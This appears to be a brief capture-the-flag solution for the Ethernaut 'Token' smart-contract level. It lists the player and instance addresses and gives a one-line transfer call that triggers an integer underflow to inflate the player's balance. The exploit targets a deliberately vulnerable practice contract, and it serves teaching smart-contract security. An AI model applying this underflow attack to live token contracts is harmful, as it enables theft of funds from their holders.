// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0xb4B3CCc397D3E5A5E6f7990BEc16bbe5b4036Db2

// solution

// you start with a balance of 20, so you transfer 21 to any other account
// then when the contract substract 21 to your balance, it will cause an underflow that results in the maximum value of an uint256 variable
await contract.transfer('0xb4B3CCc397D3E5A5E6f7990BEc16bbe5b4036Db2', 21);